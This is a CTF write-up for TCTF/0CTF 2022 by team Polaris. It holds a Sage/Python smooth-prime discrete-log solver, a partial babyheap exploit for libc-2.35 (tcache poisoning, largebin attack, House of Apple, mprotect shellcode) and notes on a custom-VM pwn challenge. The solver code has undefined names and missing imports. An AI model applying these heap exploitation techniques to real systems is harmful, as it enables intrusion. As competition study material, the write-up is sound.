---
title: TCTF/0CTF 2022 - Polaris Writeup
contest: TCTF/0CTF
year: 2022
team: Polaris
difficulty: hard
vuln_type: pwn_unknown
tags: [smooth-prime, discrete-log, babyheap-tcache, ezvm-pwn, libc-2.35, sage]
attack_chain:
- 找 magic 满足 magic_num * 2^(384-LEN*8) + i * 2^(384-LEN*8-16) + 1 全小因子
- 构造 p+1 光滑
- primitive_root(n+1) 找生成元
- sha384 primitive_root 哈希为 num2
- discrete_log 求 e 满足 g^e = num2 mod (n+1)
- 输出 P, E, data
- flag: Hope_you_can_solve_by_smoothness_this_time
- babyheap: tcache poisoning + largebin attack 拿 libc
- House of Apple 改 IO_FILE → stack pivot → mprotect RWX → shellcode
- libc-2.35 IO_validate_vtable 检验 → _IO_wfile_jumps 绕开
- orw 沙箱读 flag
- ezvm: 自定义 VM (22/20/21/0/3/9/4/2/1 opcode)
- 4 阶段 VM 注入 + 内存分配触发 mprotect
- 偏移 0x2672e0 找 exit_funcs
- 通过 one_gadget 触发
key_payload: n+1 全小因子 (光滑) → Pohlig-Hellman
one_liner: TCTF/0CTF 2022 Polaris：Crypto 光滑数 DLP + Pwn babyheap 2.35 largebin + ezvm 自定义 VM。
lesson: p+1 光滑时 Pohlig-Hellman 直接降级 DLP；libc-2.35 后 vtable 范围检查使 House of Apple 成为主流绕过。
quality: high
---
# TCTF/0CTF 2022 – Polaris

## 1. Crypto - smooth prime DLP
```python
from Crypto.Util.number import *
import gmpy2
from hashlib import sha384
from string import ascii_letters, digits
from itertools import product

table = ascii_letters + digits + '!#$%&*-?'
def proof_of_work(tail, _hash):
    for i in product(table, repeat=4):
        head = ''.join(i)
        t = hashlib.sha256((head + tail).encode()).hexdigest()
        if t == _hash:
            return head

magic_hex = input("magic: ")
magic = binascii.unhexlify(magic_hex)
magic_num = bytes_to_long(magic)

# 找 magic 满足 n = magic_num*2^(384-LEN*8) + i*2^(384-LEN*8-16) + 1 全 40-bit 小因子
for i in range(65536):
    n = magic_num * 2**(384 - LEN*8) + i * 2**(384 - LEN*8-16)
    if is_prime(n + 1):
        f = factor(n)
        if all(p < 2**40 for p, e in f):
            num1 = primitive_root(n+1)
            data = str(hex(int(num1)))[2:].encode()
            num2 = int(sha384(data).hexdigest(), 16)
            e = discrete_log(Zmod(n+1)(num2), Zmod(n+1)(num1))
            if pow(num1, e, n+1) == num2 % (n+1):
                P, E = hex(n+1)[2:], hex(e)[2:]
                print(P, E, data)  # solved
                break
```

nc 后爆破 SHA256 PoW + 计算 P,E → `flag{Hope_you_can_solve_by_smoothness_this_time}`

## 2. PWN - babyheap (libc-2.35)
- 全保护 + 1MB+ 堆块
- tcache poisoning + largebin attack 泄 libc + 改 stdout
- environ leak 拿 stack_addr
- mprotect 改栈为 RWX
- 写 shellcode (open+read+write flag)

```python
sh.add(0x8, b''); sh.add(0x208, b''); sh.add(0x8, b''); sh.add(0x208, b'')
sh.add(0x8, b'')
sh.edit(0, b'a'*0x18 + p64(0x441))
sh.delete(1)
sh.add(0x208, b'')
# ... tcache + largebin attack
sh.edit(6, flat([0xfbad2887 | 0x1000, 0, 0, 0, libc_addr+libc.sym['environ'], ...]))
```

## 3. PWN - ezvm
- 自定义 VM 22/20/21/0/3/9/4/2/1 opcode (Load/Store/Add/Sub/Mul/Div/Cmp/Br/...)
- 4 阶段提交 VM code
- 最终阶段 memory count = 0x80 + 0x4000000000000000 触发 mprotect
- 跳到栈上 one_gadget
